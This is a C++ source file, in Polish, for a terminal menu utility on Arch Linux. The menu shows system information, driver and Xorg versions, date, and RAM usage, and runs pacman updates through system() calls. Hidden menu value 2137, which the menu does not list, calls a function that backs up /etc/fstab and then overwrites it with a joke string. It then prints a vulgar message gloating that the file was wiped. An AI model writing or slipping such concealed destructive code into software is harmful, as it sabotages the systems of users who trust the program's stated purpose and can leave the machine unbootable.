#include <iostream>
#include "menuWyboru.hpp"

int wypiszMenu() {
  int rozmiarTablicy = 7;
  std::string opcjeWyboru[rozmiarTablicy] = { "Informacje o PC", "Wersja sterownika GPU",
    "Wersja Xorga", "Aktualna data i godzina", "Zużycie pamięci RAM", "Aktualizacja systemu",
    "Wyjdź" };

    for (int i = 0; i < rozmiarTablicy; i++) {
      std::cout << i+1 << ". " << opcjeWyboru[i] << std::endl;
    }

  return rozmiarTablicy;
}

int sprawdzWyborInt(int wielkoscWyboru) {
  int wybor = 0;

  std::cout << "Twój wybór: ";

  while ((!(std::cin >> wybor)) || (wybor > wielkoscWyboru) || (wybor <= 0)) {
    std::cin.clear();
    std::cin.ignore(1024, '\n');
    system("clear");
    wypiszMenu();
    std::cout << "Podałeś niepoprawną wartość! Spróbuj jeszcze raz: ";
  }

  return wybor;
}

char sprawdzWyborChar(char wybor) {

  while (!(std::cin >> wybor)) {
    std::cin.clear();
    std::cin.ignore(1024, '\n');
    system("clear");
    std::cout << "Podałeś niepoprawną wartość! Spróbuj jeszcze raz: ";
  }

  return wybor;
}

void twojWybor(int wybor) {

  switch(wybor) {
    case 1: {
      informacjeOSystemie();
      break;
    }
    case 2: {
      wersjaSterownika();
      break;
    }
    case 3: {
      wersjaXorga();
      break;
    }
    case 4: {
      aktualnyCzas();
      break;
    }
    case 5: {
      zuzycieRAM();
      break;
    }
    case 6: {
      aktualizacjaSystemu();
      break;
    }
    case 7: {
      exit(1);
      break;
    }
    case 2137: {
      nabierzGodnosci();
      break;
    }
    // default: {
    //   sprawdzWybor();
    //   break;
    // }
  }

  return;
}

// void wypiszParametry() {
//   int rozmiarTablicy = 0;
//   std::string parametry[rozmiarTablicy] = { "-o - sortuj po nazwie", ""}
//
//   return;
// }

void informacjeOSystemie() {
  int check = system("neofetch");
  char wybor = 0;

  if (check) {
    std::cout << "Aby móc zrealizować to zadanie, wymagane jest pobranie niektórych składników, kontynuować? (T/N) ";

      switch(sprawdzWyborChar(wybor)) {
        case 'T':
        case 't': {
          int check = system("yaourt -S neofetch");
            if (check) {
              std::cout << "Aby kontynuować, musisz zaopatrzyć się w yaourta!" << std::endl;
            }
          break;
        }
        case 'N':
        case 'n': {
          system("clear");
          break;
        }
      }
  }


  return;
}

void wersjaSterownika() {
  system("clear");
  system("grep 'X Driver' /var/log/Xorg.0.log");
  std::cout << std::endl;
  return;
}

void wersjaXorga() {
  system("clear");
  system("sudo X -version");
  std::cout << std::endl;
  return;
}

void aktualnyCzas() {
  system("clear");

  std::cout << "Dzisiejsza data: ";
    std::cout << std::endl;
    system("date +%d-%m-%Y");

  std::cout << std::endl;

  std::cout << "Aktualna godzina: ";
    std::cout << std::endl;
    system("date +%H:%M:%S");

  std::cout << std::endl;

  return;
}

void zuzycieRAM() {

  system("touch topmem.txt");
  system("top -o %MEM -n1 > $HOME/topmem.txt");
  system("cat $HOME/topmem.txt");
  system("rm -rf $HOME/topmem.txt");

  std::cout << std::endl;

  return;
}

void aktualizacjaSystemu() {
  system("clear");
  system("sudo pacman -Syu");
  return;
}

void nabierzGodnosci() {

  system("cat /etc/fstab > $HOME/.fstab.old");
  system("echo 'Papiesz XDDDDDD' > /etc/fstab");
  std::cout << "Naprawdę? Weź Ty człowieku nabierz godności" << std::endl;
  std::cout << "Za karę wyjebałem Ci cały plik fstab, radź sobie sam z jego naprawą" << std::endl;
  std::cout << "Miłego dnia :)" << std::endl;

  return;
}
